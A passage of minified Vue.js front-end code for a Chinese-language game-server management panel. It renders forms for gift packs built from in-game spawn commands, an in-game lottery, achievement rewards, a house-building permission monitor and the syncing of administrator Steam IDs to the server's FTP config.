85px)","margin-left":"5px",position:"relative",display:"inline-block"}},[i("a-input",{staticStyle:{width:"100%"},attrs:{type:"textarea",disabled:!e.edit,"auto-size":{minRows:6,maxRows:6},placeholder:"每一条内容以回车换行隔开"},model:{value:n.commands,callback:function(t){e.$set(n,"commands",t)},expression:"gift.commands"}}),e.edit?i("commands-picker",{on:{select:function(e,t){n.commands=n.commands+(n.commands.length?"\n":"")+e+("number"==typeof t&&t>=2?t<=10?" "+t:" 10":"")}}}):e._e()],1)],1)]:"dollar"===n.configType?[i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("赠送美金数量:")]),i("a-input-number",{staticStyle:{"margin-left":"5px"},attrs:{min:0,disabled:!e.edit},model:{value:n.dollar,callback:function(t){e.$set(n,"dollar",t)},expression:"gift.dollar"}})],1)]:"vip"===n.configType?[i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("会员等级:")]),i("a-select",{staticStyle:{width:"calc(100% - 140px)","margin-left":"5px"},attrs:{disabled:!e.edit},model:{value:n.level,callback:function(t){e.$set(n,"level",t)},expression:"gift.level"}},e._l(e.levelList,(function(t){return i("a-select-option",{key:t,attrs:{title:t}},[e._v(e._s(t))])})),1)],1),i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("会员有效天数:")]),i("a-input-number",{staticStyle:{"margin-left":"5px"},attrs:{min:0,disabled:!e.edit},model:{value:n.levelExpireDays,callback:function(t){e.$set(n,"levelExpireDays",t)},expression:"gift.levelExpireDays"}})],1)]:"military"===n.configType?[i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("军衔等级:")]),i("a-select",{staticStyle:{width:"calc(100% - 140px)","margin-left":"5px"},attrs:{disabled:!e.edit},model:{value:n.militaryLevelId,callback:function(t){e.$set(n,"militaryLevelId",t)},expression:"gift.militaryLevelId"}},e._l(e.militaryLevelList,(function(t){return i("a-select-option",{key:t.levelId,attrs:{title:t.level}},[e._v(e._s(t.level))])})),1)],1),i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("军衔有效天数:")]),i("a-input-number",{staticStyle:{"margin-left":"5px"},attrs:{min:0,disabled:!e.edit},model:{value:n.militaryLevelExpireDays,callback:function(t){e.$set(n,"militaryLevelExpireDays",t)},expression:"gift.militaryLevelExpireDays"}})],1)]:e._e()],2)}))],2)})):e._e()],2),i("a-form-model-item",{attrs:{label:"公益彩票设置",prop:"LotteryConfigs"}},[i("div",{staticStyle:{width:"100%"}},[i("a-button",{attrs:{size:"small",disabled:!e.edit,icon:"plus"},on:{click:function(){e.settingsForm.LotteryConfigs.push({lotteryName:"新彩票",ruleType:"guess",drawType:"loot",lootCycle:"day",drawDate:null,grades:[{ruleType:"guess",point:4,totalBonusRate:40,noPrize:!1},{ruleType:"guess",point:3,totalBonusRate:30,noPrize:!1},{ruleType:"guess",point:2,totalBonusRate:20,noPrize:!1},{ruleType:"guess",point:1,totalBonusRate:10,noPrize:!0},{ruleType:"normal",prizeName:"一等奖",winRate:10,totalBonusRate:70},{ruleType:"normal",prizeName:"二等奖",winRate:30,totalBonusRate:20},{ruleType:"normal",prizeName:"三等奖",winRate:60,totalBonusRate:10}],singlePrice:100,enableMulti:!0,initPool:1e4,taxPercent:10})}}},[e._v("添加 ")]),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:e.expander.LotteryConfigs?"up":"down"},on:{click:function(){e.$set(e.expander,"LotteryConfigs",!e.expander.LotteryConfigs)}}},[e._v(e._s(e.expander.LotteryConfigs?"隐藏":"显示"))])],1),e.expander.LotteryConfigs?e._l(e.settingsForm.LotteryConfigs,(function(t,a){return i("div",{key:a,staticStyle:{width:"100%","margin-top":"10px",padding:"10px",border:"1px #aaaaaa dashed","border-radius":"4px"}},[i("div",{staticStyle:{width:"100%"}},[i("span",[e._v("彩票名称:")]),i("a-input",{staticStyle:{width:"calc(100% - 140px)","margin-left":"5px"},attrs:{disabled:!e.edit},model:{value:t.lotteryName,callback:function(i){e.$set(t,"lotteryName",i)},expression:"lottery.lotteryName"}}),i("a-button",{staticStyle:{float:"right",transform:"translateY(7px)"},attrs:{disabled:!e.edit,icon:"delete",type:"danger",size:"small"},on:{click:function(){e.settingsForm.LotteryConfigs.splice(a,1)}}},[e._v("移除")])],1),i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("彩票类型:")]),i("a-radio-group",{staticStyle:{"margin-left":"5px"},attrs:{disabled:!e.edit},model:{value:t.ruleType,callback:function(i){e.$set(t,"ruleType",i)},expression:"lottery.ruleType"}},[i("a-radio",{attrs:{value:"guess"}},[e._v("竞猜数字")]),i("a-radio",{attrs:{value:"normal"}},[e._v("概率抽奖")])],1)],1),i("div",{staticStyle:{width:"100%","margin-top":"5px","margin-bottom":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("奖项设置:")]),i("a-button",{attrs:{size:"small",disabled:!e.edit||!t.ruleType.length,icon:"plus"},on:{click:function(){t.grades.push("guess"===t.ruleType?{ruleType:"guess",point:1,totalBonusRate:0,noPrize:!1}:{ruleType:"normal",prizeName:"X等奖",winRate:0,totalBonusRate:0})}}},[e._v("添加 ")])],1),e._l(t.grades,(function(a,n){return[a.ruleType===t.ruleType?i("div",{key:n,staticStyle:{width:"100%","margin-top":"10px",padding:"10px",border:"1px #aaaaaa dashed","border-radius":"4px"}},[i("div",{staticStyle:{width:"100%"}},[i("span",[e._v("彩票类型: ")]),i("strong",[e._v(e._s("guess"===t.ruleType?"竞猜数字":"normal"===t.ruleType?"概率抽奖":"-"))]),i("a-button",{staticStyle:{float:"right",transform:"translateY(7px)"},attrs:{disabled:!e.edit,icon:"delete",type:"danger",size:"small"},on:{click:function(){t.grades.splice(n,1)}}},[e._v("移除")])],1),"guess"===t.ruleType?[i("div",{staticStyle:{width:"100%"}},[i("span",[e._v("猜中数字个数:")]),i("a-input-number",{staticStyle:{"margin-left":"5px"},attrs:{min:0,disabled:!e.edit},model:{value:a.point,callback:function(t){e.$set(a,"point",t)},expression:"grade.point"}})],1),i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("是否无奖:")]),i("a-radio-group",{staticStyle:{"margin-left":"5px"},attrs:{disabled:!e.edit},model:{value:a.noPrize,callback:function(t){e.$set(a,"noPrize",t)},expression:"grade.noPrize"}},[i("a-radio",{attrs:{value:!0}},[e._v("ON")]),i("a-radio",{attrs:{value:!1}},[e._v("OFF")])],1)],1),!0!==a.noPrize?i("div",{staticStyle:{width:"100%"}},[i("span",[e._v("总奖池占比:")]),i("a-input-number",{staticStyle:{"margin-left":"5px"},attrs:{min:1,max:100,disabled:!e.edit},model:{value:a.totalBonusRate,callback:function(t){e.$set(a,"totalBonusRate",t)},expression:"grade.totalBonusRate"}})],1):e._e()]:e._e(),"normal"===t.ruleType?[i("div",{staticStyle:{width:"100%"}},[i("span",[e._v("奖项名称:")]),i("a-input",{staticStyle:{"margin-left":"5px"},attrs:{disabled:!e.edit},model:{value:a.prizeName,callback:function(t){e.$set(a,"prizeName",t)},expression:"grade.prizeName"}})],1),!0!==a.noPrize?i("div",{staticStyle:{width:"100%"}},[i("span",[e._v("中奖率:")]),i("a-input-number",{staticStyle:{"margin-left":"5px"},attrs:{min:1,max:100,disabled:!e.edit},model:{value:a.winRate,callback:function(t){e.$set(a,"winRate",t)},expression:"grade.winRate"}})],1):e._e(),!0!==a.noPrize?i("div",{staticStyle:{width:"100%"}},[i("span",[e._v("总奖池占比:")]),i("a-input-number",{staticStyle:{"margin-left":"5px"},attrs:{min:1,max:100,disabled:!e.edit},model:{value:a.totalBonusRate,callback:function(t){e.$set(a,"totalBonusRate",t)},expression:"grade.totalBonusRate"}})],1):e._e()]:e._e()],2):e._e()]})),i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("彩票开奖类型:")]),i("a-radio-group",{staticStyle:{"margin-left":"5px"},attrs:{disabled:!e.edit},on:{change:function(t){e.onChangeLotteryDrawType(a,t.target.value)}},model:{value:t.drawType,callback:function(i){e.$set(t,"drawType",i)},expression:"lottery.drawType"}},[i("a-radio",{attrs:{value:"loot"}},[e._v("固定间隔开奖")]),i("a-radio",{attrs:{value:"once"}},[e._v("指定日期开奖")])],1)],1),"loot"===t.drawType?i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("开奖间隔(当天凌晨一点):")]),i("a-radio-group",{staticStyle:{"margin-left":"5px"},attrs:{disabled:!e.edit},model:{value:t.lootCycle,callback:function(i){e.$set(t,"lootCycle",i)},expression:"lottery.lootCycle"}},[i("a-radio",{attrs:{value:"day"}},[e._v("天")]),i("a-radio",{attrs:{value:"week"}},[e._v("周")]),i("a-radio",{attrs:{value:"month"}},[e._v("月")])],1)],1):i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("开奖日期(当天凌晨一点):")]),i("a-date-picker",{attrs:{disabled:!e.edit,"show-time":{format:"YYYY-MM-DD"},format:"YYYY-MM-DD",value:t.drawDate,allowClear:""},on:{change:function(i){e.$set(t,"drawDate",i)}}})],1),i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("单注价格:")]),i("a-input-number",{staticStyle:{"margin-left":"5px"},attrs:{min:0,disabled:!e.edit},model:{value:t.singlePrice,callback:function(i){e.$set(t,"singlePrice",i)},expression:"lottery.singlePrice"}})],1),i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("多注开关:")]),i("a-radio-group",{staticStyle:{"margin-left":"5px"},attrs:{disabled:!e.edit},model:{value:t.enableMulti,callback:function(i){e.$set(t,"enableMulti",i)},expression:"lottery.enableMulti"}},[i("a-radio",{attrs:{value:!0}},[e._v("允许多注")]),i("a-radio",{attrs:{value:!1}},[e._v("仅限单注")])],1)],1),i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("初始奖池:")]),i("a-input-number",{staticStyle:{"margin-left":"5px"},attrs:{min:0,disabled:!e.edit},model:{value:t.initPool,callback:function(i){e.$set(t,"initPool",i)},expression:"lottery.initPool"}})],1),i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("偶然所得税:")]),i("a-input-number",{staticStyle:{"margin-left":"5px"},attrs:{min:0,max:100,disabled:!e.edit},model:{value:t.taxPercent,callback:function(i){e.$set(t,"taxPercent",i)},expression:"lottery.taxPercent"}})],1)],2)})):e._e()],2),i("a-form-model-item",{attrs:{label:"成就礼包设置",prop:"AchieveGiftConfigs"}},[i("div",{staticStyle:{width:"100%"}},[i("a-button",{attrs:{size:"small",disabled:!e.edit,icon:"plus"},on:{click:function(){e.settingsForm.AchieveGiftConfigs.push({showUploadConfig:!1,id:null,name:"",imgSrc:"",type:"",value:null,each:"day",configType:"command",commands:"",isTeleport:!0,noTeleportMode:"mode1"})}}},[e._v("添加 ")]),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:e.expander.AchieveGiftConfigs?"up":"down"},on:{click:function(){e.$set(e.expander,"AchieveGiftConfigs",!e.expander.AchieveGiftConfigs)}}},[e._v(e._s(e.expander.AchieveGiftConfigs?"隐藏":"显示"))])],1),e.expander.AchieveGiftConfigs?e._l(e.settingsForm.AchieveGiftConfigs,(function(t,a){return i("div",{key:a,staticStyle:{width:"100%","margin-top":"10px",padding:"10px",border:"1px #aaaaaa dashed","border-radius":"4px"}},[i("div",{staticStyle:{width:"100%"}},[i("span",[e._v("礼包数字ID:")]),i("a-input-number",{staticStyle:{width:"calc(100% - 150px)","margin-left":"5px"},attrs:{min:0,precision:0,disabled:!e.edit},model:{value:t.id,callback:function(i){e.$set(t,"id",i)},expression:"gift.id"}}),i("a-button",{staticStyle:{float:"right",transform:"translateY(7px)"},attrs:{disabled:!e.edit,icon:"delete",type:"danger",size:"small"},on:{click:function(){e.settingsForm.AchieveGiftConfigs.splice(a,1)}}},[e._v("移除 ")])],1),i("div",{staticStyle:{width:"100%"}},[i("span",[e._v("礼包描述:")]),i("a-input",{staticStyle:{width:"calc(100% - 65px)","margin-left":"5px"},attrs:{disabled:!e.edit},model:{value:t.name,callback:function(i){e.$set(t,"name",i)},expression:"gift.name"}})],1),i("div",{staticStyle:{width:"100%"}},[i("span",[e._v("礼包图片链接:")]),i("image-select",{staticStyle:{display:"inline-block",width:"calc(100% - 115px)","margin-left":"5px"},attrs:{disabled:!e.edit,"show-upload-config":t.showUploadConfig,value:t.imgSrc},on:{"change-show-upload-config":function(e){t.showUploadConfig=e},change:function(i){e.$set(t,"imgSrc",i),e.$nextTick((function(){e.$refs.settingsForm.validate()}))}}}),i("a-tooltip",{attrs:{placement:"left",title:"可以上传图片或直接使用图片url"}},[i("a-icon",{staticStyle:{"margin-left":"8px",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1)],1),i("div",{staticStyle:{width:"100%"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("成就种类:")]),i("a-select",{staticStyle:{width:"180px","margin-left":"5px"},attrs:{disabled:!e.edit},on:{change:function(t){e.onChangeAchieveGiftType(a,t)}},model:{value:t.type,callback:function(i){e.$set(t,"type",i)},expression:"gift.type"}},e._l(e.achieveTypeKeyValue,(function(t,a){return i("a-select-option",{key:a,attrs:{title:a}},[e._v(e._s(t))])})),1)],1),"lockPickTime"===t.type||"lockPickUsedTime"===t.type||"defusalTime"===t.type||"defusalUsedTime"===t.type?i("div",{staticStyle:{width:"100%"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("难度种类:")]),i("a-select",{staticStyle:{width:"180px","margin-left":"5px"},attrs:{disabled:!e.edit},model:{value:t.lockType,callback:function(i){e.$set(t,"lockType",i)},expression:"gift.lockType"}},e._l(e.lockTypeKeyValue,(function(t,a){return i("a-select-option",{key:a,attrs:{title:a}},[e._v(e._s(t))])})),1)],1):e._e(),i("div",{staticStyle:{width:"100%"}},[i("span",[e._v("达标数值:")]),i("a-input-number",{staticStyle:{width:"180px","margin-left":"5px"},attrs:{min:0,disabled:!e.edit},model:{value:t.value,callback:function(i){e.$set(t,"value",i)},expression:"gift.value"}})],1),i("div",{staticStyle:{width:"100%"}},[i("span",[e._v("限制周期:")]),i("a-select",{staticStyle:{width:"180px","margin-left":"5px"},attrs:{disabled:!e.edit},model:{value:t.each,callback:function(i){e.$set(t,"each",i)},expression:"gift.each"}},e._l(e.claimLimitEachKeyValue,(function(t,a){return i("a-select-option",{key:a,attrs:{title:a}},[e._v(e._s(t))])})),1)],1),i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("礼包类型:")]),i("a-radio-group",{staticStyle:{"margin-left":"5px"},attrs:{disabled:!e.edit},on:{change:function(t){e.onChangeAchieveGiftConfigType(a,t.target.value)}},model:{value:t.configType,callback:function(i){e.$set(t,"configType",i)},expression:"gift.configType"}},[i("a-radio",{attrs:{value:"command"}},[e._v("生成命令的商品")]),i("a-radio",{attrs:{value:"dollar"}},[e._v("美金")]),i("a-radio",{attrs:{value:"vip"}},[e._v("会员等级")]),i("a-radio",{attrs:{value:"military"}},[e._v("军衔等级")])],1)],1),"command"===t.configType?[i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("奖品发放方式:")]),i("a-radio-group",{staticStyle:{"margin-left":"5px"},attrs:{disabled:!e.edit},model:{value:t.isTeleport,callback:function(i){e.$set(t,"isTeleport",i)},expression:"gift.isTeleport"}},[i("a-radio",{attrs:{value:!0}},[e._v("需要传送")]),i("a-radio",{attrs:{value:!1}},[e._v("不需要传送")])],1)],1),!1===t.isTeleport?i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("隔空刷货的格式")]),i("a-popover",{attrs:{placement:"left"}},[i("div",{staticStyle:{width:"500px"},attrs:{slot:"content"},slot:"content"},[i("p",{staticStyle:{"font-weight":"bolder"}},[e._v('模式一: 【#spawnXXXX <商品> <数量> Location "<X坐标> <Y坐标> <Z坐标>"】 发货前获取坐标')]),i("p",{staticStyle:{"font-weight":"bolder"}},[e._v('模式二: 【#spawnXXXX <商品> <数量> Location "{X=<X坐标> Y=<Y坐标> Z=<Z坐标>|P=<俯仰角> Y=<侧航角> R=<翻滚角>}"】 发货前获取坐标')]),i("p",{staticStyle:{"font-weight":"bolder"}},[e._v("模式三: 【#spawnXXXX <商品> <数量> Location <Steam ID>】")])]),i("a-icon",{staticStyle:{"margin-left":"2px",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1),i("span",[e._v(":")]),i("a-radio-group",{staticStyle:{"margin-left":"5px"},attrs:{disabled:!e.edit||!0===t.isTeleport},model:{value:t.noTeleportMode,callback:function(i){e.$set(t,"noTeleportMode",i)},expression:"gift.noTeleportMode"}},[i("a-radio",{attrs:{disabled:!e.edit||!0===t.isTeleport,value:"mode1"}},[e._v("模式一")]),i("a-radio",{attrs:{disabled:!0,value:"mode2"}},[e._v("模式二")]),i("a-radio",{attrs:{disabled:!e.edit||!0===t.isTeleport,value:"mode3"}},[e._v("模式三")])],1)],1):e._e(),i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("生成命令")]),i("a-tooltip",{attrs:{placement:"top",title:"每一条消息/命令使用回车键换行隔开(特殊命令: <ctrl-a> - 全选; <x> - 按下X键; <ctrl-c> - 复制; <ctrl-v> - 粘贴; <enter> - 回车; <tab> / <tab-n> - tab键; <clean-didi-vehicles> - 清空滴滴车)"}},[i("a-icon",{staticStyle:{"margin-left":"2px",cursor:"pointer","vertical-align":"top",transform:"translateY(13px)"},attrs:{type:"info-circle",theme:"filled"}})],1),i("span",{staticStyle:{"margin-left":"4px","vertical-align":"top"}},[e._v(":")]),i("div",{staticStyle:{width:"calc(100% - 85px)","margin-left":"5px",position:"relative",display:"inline-block"}},[i("a-input",{staticStyle:{width:"100%"},attrs:{type:"textarea",disabled:!e.edit,"auto-size":{minRows:6,maxRows:6},placeholder:"每一条内容以回车换行隔开"},model:{value:t.commands,callback:function(i){e.$set(t,"commands",i)},expression:"gift.commands"}}),e.edit?i("commands-picker",{on:{select:function(e,i){t.commands=t.commands+(t.commands.length?"\n":"")+e+("number"==typeof i&&i>=2?i<=10?" "+i:" 10":"")}}}):e._e()],1)],1)]:"dollar"===t.configType?[i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("赠送美金数量:")]),i("a-input-number",{staticStyle:{"margin-left":"5px"},attrs:{min:0,disabled:!e.edit},model:{value:t.dollar,callback:function(i){e.$set(t,"dollar",i)},expression:"gift.dollar"}})],1)]:"vip"===t.configType?[i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("会员等级:")]),i("a-select",{staticStyle:{width:"calc(100% - 140px)","margin-left":"5px"},attrs:{disabled:!e.edit},model:{value:t.level,callback:function(i){e.$set(t,"level",i)},expression:"gift.level"}},e._l(e.levelList,(function(t){return i("a-select-option",{key:t,attrs:{title:t}},[e._v(e._s(t))])})),1)],1),i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("会员有效天数:")]),i("a-input-number",{staticStyle:{"margin-left":"5px"},attrs:{min:0,disabled:!e.edit},model:{value:t.levelExpireDays,callback:function(i){e.$set(t,"levelExpireDays",i)},expression:"gift.levelExpireDays"}})],1)]:"military"===t.configType?[i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("军衔等级:")]),i("a-select",{staticStyle:{width:"calc(100% - 140px)","margin-left":"5px"},attrs:{disabled:!e.edit},model:{value:t.militaryLevelId,callback:function(i){e.$set(t,"militaryLevelId",i)},expression:"gift.militaryLevelId"}},e._l(e.militaryLevelList,(function(t){return i("a-select-option",{key:t.levelId,attrs:{title:t.level}},[e._v(e._s(t.level))])})),1)],1),i("div",{staticStyle:{width:"100%","margin-top":"5px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("军衔有效天数:")]),i("a-input-number",{staticStyle:{"margin-left":"5px"},attrs:{min:0,disabled:!e.edit},model:{value:t.militaryLevelExpireDays,callback:function(i){e.$set(t,"militaryLevelExpireDays",i)},expression:"gift.militaryLevelExpireDays"}})],1)]:e._e()],2)})):e._e()],2),i("a-form-model-item",{attrs:{label:"建家权限防滥用监控列表",prop:"BuyArtifactRightMonitor"}},[i("div",{staticStyle:{width:"100%"}},[i("a-button",{attrs:{size:"small",disabled:!e.edit,icon:"plus"},on:{click:function(){e.settingsForm.BuyArtifactRightMonitor.push({steamId:"",timestampStart:null,timestampEnd:null})}}},[e._v("添加 ")]),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:e.expander.BuyArtifactRightMonitor?"up":"down"},on:{click:function(){e.$set(e.expander,"BuyArtifactRightMonitor",!e.expander.BuyArtifactRightMonitor)}}},[e._v(e._s(e.expander.BuyArtifactRightMonitor?"隐藏":"显示"))])],1),e.expander.BuyArtifactRightMonitor?e._l(e.settingsForm.BuyArtifactRightMonitor,(function(t,a){return i("div",{key:a,staticStyle:{width:"100%","margin-top":"10px"}},[i("div",{staticStyle:{width:"100%"}},[i("span",[e._v("玩家Steam ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"5px"},attrs:{disabled:!e.edit},model:{value:t.steamId,callback:function(i){e.$set(t,"steamId",i)},expression:"BuyArtifactRightItem.steamId"}}),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{disabled:!e.edit,icon:"delete",type:"danger",size:"small"},on:{click:function(){e.settingsForm.BuyArtifactRightMonitor.splice(a,1)}}},[e._v("移除 ")]),i("div",{staticStyle:{width:"100%"}},[i("span",[e._v("建家权限时间段:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{disabled:!e.edit,"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:[t.timestampStart,t.timestampEnd],allowClear:""},on:{change:function(i){e.$set(t,"timestampStart",i[0]),e.$set(t,"timestampEnd",i[1])}}})],1)],1)])})):e._e()],2),i("a-form-model-item",{attrs:{"label-col":{span:10},"wrapper-col":{span:14},prop:"EnableAutoAsyncServerAdminSteamIdConfigs"}},[i("template",{slot:"label"},[i("span",[e._v("自动同步管理员配置到FTP")]),i("a-tooltip",{attrs:{placement:"top",title:"开启此选项后下面的管理员配置列表内容会每两分钟反馈到服务器FTP配置文件一次，目前已知只有GGHost/Pingperfect生效，其他服务商的服务器请勿开启，否则可能造成不可控问题"}},[i("a-icon",{staticStyle:{"margin-left":"5px",transform:"translateY(13px)",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1)],1),i("a-switch",{attrs:{disabled:!e.edit||!(e.userInfo&&"sysAdmin"===e.userInfo.role)},model:{value:e.settingsForm.EnableAutoAsyncServerAdminSteamIdConfigs,callback:function(t){e.$set(e.settingsForm,"EnableAutoAsyncServerAdminSteamIdConfigs",t)},expression:"settingsForm.EnableAutoAsyncServerAdminSteamIdConfigs"}}),e.userInfo&&"sysAdmin"===e.userInfo.role?i("a-button",{staticStyle:{"margin-left":"20px"},attrs:{type:"primary",loading:e.loadingRefreshServerAdminSteamIdConfigs,icon:"sync"},on:{click:e.refreshServerAdminSteamIdConfigs}},[e._v("手动更新管理员配置FTP")]):e._e()],2),i("a-form-model-item",{attrs:{label:"服务器管理员配置FTP路径","label-col":{span:10},"wrapper-col":{span:14},prop:"ServerAdminSteamIdConfigsPath",rules:{required:e.settingsForm.EnableAutoAsyncServerAdminSteamIdConfigs,trigger:"change",message:"请输入服务器管理员配置FTP路径",validator:function(t,i,a){!e.settingsForm.EnableAutoAsyncServerAdminSteamIdConfigs||"string"==typeof i&&i.length>=1?a():a(new e.Error("请输入服务器管理员配置FTP路径"))}}}},[i("a-input",{attrs:{disabled:!e.edit||!0!==e.settingsForm.EnableAutoAsyncServerAdminSteamIdConfigs||!(e.userInfo&&"sysAdmin"===e.userInfo.role)},model:{value:e.settingsForm.ServerAdminSteamIdConfigsPath,callback:function(t){e.$set(e.settingsForm,"ServerAdminSteamIdConfigsPath",t)},expression:"settingsForm.ServerAdminSteamIdConfigsPath"}})],1),i("a-form-model-item",{attrs:{label:"服务器管理员配置内容","label-col":{span:10},"wrapper-col":{span:14},prop:"ServerAdminSteamIdConfigsContent"}},[i("div",{staticStyle:{width:"100%"}},[i("a-button",{attrs:{size:"small",disabled:!e.edit||!(e.userInfo&&"sysAdmin"===e.userInfo.role),icon:"plus"},on:{click:function(){e.settingsForm.ServerAdminSteamIdConfigsContent.push({steamId:"",godMode:!0,expireTimeStamp:null})}}},[e._v("添加 ")]),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:e.expander.ServerAdminSteamIdConfigsContent?"up":"down"},on:{click:function(){e.$set(e.expander,"ServerAdminSteamIdConfigsContent",!e.expander.ServerAdminSteamIdConfigsContent)}}},[e._v(e._s(e.expander.ServerAdminSteamIdConfigsContent?"隐藏":"显示"))])],1),e.expander.ServerAdminSteamIdConfigsContent?e._l(e.settingsForm.ServerAdminSteamIdConfigsContent,(function(t,a){return i("div",{key:a,staticStyle:{width:"100%","margin-top":"10px",padding:"10px",border:"1px #aaaaaa dashed","border-radius":"4px"}},[i("div",{staticStyle:{width:"100%"}},[i("span",{staticStyle:{display:"inline-block",width:"75px","text-align":"right","padding-right":"10px"}},[e._v("Steam ID:")]),i("a-input",{staticStyle:{width:"calc(100% - 160px)"},attrs:{disabled:!e.edit||!0!==e.settingsForm.EnableAutoAsyncServerAdminSteamIdConfigs||!(e.userInfo&&"sysAdmin"===e.userInfo.role)},model:{value:t.steamId,callback:function(i){e.$set(t,"steamId",i)},expression:"content.steamId"}}),i("a-button",{staticStyle:{float:"right",transform:"translateY(7px)"},attrs:{disabled:!e.edit||!(e.userInfo&&"sysAdmin"===e.userInfo.role),icon:"delete",type:"danger",size:"small"},on:{click:function(){e.settingsForm.ServerAdminSteamIdConfigsContent.splice(a,1)}}},[e._v("移除 ")])],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"75px","text-align":"right","padding-right":"10px"}},[e._v("上帝模式:")]),i("a-switch",{attrs:{disabled:!e.edit||!0!==e.settingsForm.EnableAutoAsyncServerAdminSteamIdConfigs||!(e.userInfo&&"sysAdmin"===e.userInfo.role)},model:{value:t.godMode,callback:function(i){e.$set(t,"godMode",i)},expression:"content.godMode"}})],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"75px","text-align":"right","padding-right":"10px"}},[e._v("有效期:")]),i("a-date-picker",{attrs:{disabled:!e.edit||!0!==e.settingsForm.EnableAutoAsyncServerAdminSteamIdConfigs||!(e.userInfo&&"sysAdmin"===e.userInfo.role),"show-time":{format:"YYYY-MM-DD HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:t.expireTimeStamp,allowClear:""},on:{change:function(i){e.$set(t,"expireTimeStamp",i)}}})],1)])})):e._e()],2),!0===e.settingsForm.EnableAutoAsyncServerAdminSteamIdConfigs?i("a-form-model-item",{attrs:{label:"自动同步管理员记录和结果",prop:"AsyncServerAdminSteamIdConfigsRecord"}},[e.settingsForm.AsyncServerAdminSteamIdConfigsRecord&&e.settingsForm.AsyncServerAdminSteamIdConfigsRecord.recentTimeStamp&&e.settingsForm.AsyncServerAdminSteamIdConfigsRecord.result?[i("div",[i("span",[e._v("最近一次获取时间：")]),i("a-input",{staticStyle:{"margin-left":"10px",width:"calc(100% - 136px)"},attrs:{disabled:"",value:e.moment(parseInt(e.settingsForm.AsyncServerAdminSteamIdConfigsRecord.recentTimeStamp)).format("YYYY-MM-DD HH:mm:ss")}})],1),i("div",{staticStyle:{"margin-top":"10px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("结果：")]),i("a-input",{staticStyle:{"margin-left":"10px",width:"calc(100% - 52px)"},attrs:{type:"textarea","auto-size":{minRows:3,maxRows:3},disabled:"",value:e.settingsForm.AsyncServerAdminSteamIdConfigsRecord.result}})],1)]:[e._v("无")]],2):e._e(),i("a-form-model-item",{attrs:{label:"启用自由购买建家权限",prop:"EnableBuyGodmode"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableBuyGodmode,callback:function(t){e.$set(e.settingsForm,"EnableBuyGodmode",t)},expression:"settingsForm.EnableBuyGodmode"}})],1),i("a-form-model-item",{attrs:{label:"启用建家期间使用其他指令惩罚",prop:"EnableIllegalAdminCommandPunishment"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableIllegalAdminCommandPunishment,callback:function(t){e.$set(e.settingsForm,"EnableIllegalAdminCommandPunishment",t)},expression:"settingsForm.EnableIllegalAdminCommandPunishment"}})],1),i("a-form-model-item",{attrs:{label:"建家期间使用其他指令惩罚类型",prop:"IllegalAdminCommandPunishmentType"}},[i("a-select",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.IllegalAdminCommandPunishmentType,callback:function(t